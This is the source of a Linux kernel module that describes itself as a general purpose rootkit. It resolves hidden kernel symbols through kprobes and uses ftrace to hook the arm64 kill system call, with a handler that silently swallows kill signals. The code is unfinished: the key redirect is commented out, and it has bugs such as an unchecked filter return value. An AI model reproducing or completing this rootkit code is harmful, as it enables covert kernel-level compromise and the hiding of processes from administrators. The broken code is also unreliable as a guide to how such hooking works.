// implement using direct system call hooking#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xwillow");
MODULE_DESCRIPTION("general purpose linux rootkit");
MODULE_VERSION("1.0");

struct ftrace_hook {
    const char *name;
    void *new;
    void *orig;

    uintptr_t addr;
    struct ftrace_ops ops;
};

typedef uintptr_t (*kallsyms_lookup_name_t)(const char *symbol_name);
kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;

uintptr_t kprobe_get_func_addr(const char *func_name) {
    static struct kprobe kp;
    kp.symbol_name = func_name;
    if (register_kprobe(&kp) < 0) {
        pr_info("debug: kprobe_get_func_addr of %s failed\n", func_name);
        return -ENOENT;
    }

    uintptr_t tmp = kp.addr;
    unregister_kprobe(&kp);
    return tmp;
}

static int fh_get_func_addr(struct ftrace_hook *hook) {
    if (!kallsyms_lookup_name_) {
        kallsyms_lookup_name_ = kprobe_get_func_addr("kallsyms_lookup_name");
    }

    hook->addr = kallsyms_lookup_name_(hook->name);
    if (!hook->addr) {
        pr_info("debug: kprobe_get_func_addr of hook (%pR) failed\n", hook);
        return -ENOENT;
    }

    *((uintptr_t *) hook->orig) = hook->addr;
    return 0;
}

static notrace void fh_callback(unsigned long pc, unsigned long parent_pc, struct ftrace_ops *ops, struct pt_regs *regs) {
    // struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    // if (!within_module(parent_pc, THIS_MODULE)) {
    //     regs->pc = (unsigned long) hook->new;
    // }
    pr_info("debug: fh_callback called, FTRACE_OPS_FL_SAVE_REGS not enabled :(\n");
}

int fh_install_hook(struct ftrace_hook *hook) {
    if (!hook) {
        return -ENOENT;
    }

    int err;
    err = fh_get_func_addr(hook);
    if (err) {
        return err;
    }

    hook->ops.func = fh_callback;
    // hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
    //                 | FTRACE_OPS_FL_RECURSION_SAFE
    //                 | FTRACE_OPS_FL_IPMODIFY;

    // err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    // if (err) {
    //     pr_info("debug: ftrace_set_filter_ip failed with err (%i), &hook->ops (%pR), hook->addr @%pK\n", err, &hook->ops, hook->addr);
    //     return err;
    // }

    ftrace_set_filter(&hook->ops, hook->name, strlen(hook->name), 0);
    if (err) {
        pr_info("debug: ftrace_set_filter failed with err (%i), &hook->ops (%pR), hook->name @%s\n", err, &hook->ops, hook->name);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_info("debug: register_ftrace_function failed with err (%i), &hook->ops (%pR)\n\n", err, &hook->ops);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
}

static asmlinkage int (*orig_kill) (const struct pt_regs *);

asmlinkage notrace int hook_kill(const struct pt_regs *regs) {
    pr_info("debug: hooked kill :D\n");
    return 0;
    // return orig_kill(regs);
}

static struct ftrace_hook hook = {"__arm64_sys_kill", hook_kill, &orig_kill, 0, {NULL, NULL, NULL}};;

static int __init hook_test_mod_init(void) {
    int err;
    err = fh_install_hook(&hook);
    if (err) {
        pr_info("debug: fh_install_hook failed\n");
        return err;
    }
    pr_info("debug: module loaded\n");
    return 0;
}

static void __exit hook_test_mod_exit(void) {
    fh_remove_hook(&hook);
    pr_info("debug: module unloaded\n");
}


module_init(hook_test_mod_init);
module_exit(hook_test_mod_exit);
